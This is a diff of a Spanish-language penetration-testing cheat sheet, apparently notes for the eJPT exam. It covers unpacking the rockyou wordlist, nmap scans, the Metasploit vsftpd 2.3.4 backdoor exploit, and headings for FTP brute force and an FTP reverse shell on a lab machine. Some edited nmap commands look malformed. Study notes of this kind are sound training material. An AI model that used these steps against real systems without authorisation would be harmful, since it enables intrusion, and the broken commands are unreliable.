@@ -1,18 +1,23 @@
 0️⃣ COMANDOS GENERALES (SIEMPRE LO PRIMERO)
+¿ROCKYOU EN EJPT? /usr/share/wordlists/rockyou.txt.gz
+gunzip rockyou.txt.gz
+
+o si está en la ruta de Kali:
+
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
 
 Escaneo inicial
 nmap -vv -p- IP
 nmap -vv -p -sC -sV IP
 
-
-
 Para versiones y scripts:
 
-nmap -vv -sV -sC IP
+nmap -vv -p -sV -sC IP
 
 Escanear puertos concretos:
 
-nmap -vv -sv -p445,139,3389,49152 IP
+nmap -vv -svC -p445,139,3389,49152 IP
 
 Escaneo agresivo:
 
@@ -70,7 +75,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOST TARGET
 run
 
-FUERZA BRUTA FTP
+FUERZA BRUTA FTP 21
 
 Si hay usuario:
 
@@ -98,7 +103,7 @@ Esto aparece en tu máquina Startup.
 
 máquina STARTUP
 
-9️⃣ REVERSE SHELL DESDE FTP
+9️⃣ REVERSE SHELL DESDE FTP 21
 Te conectas al FTP
 ftp 10.10.10.5
 Ves los archivos
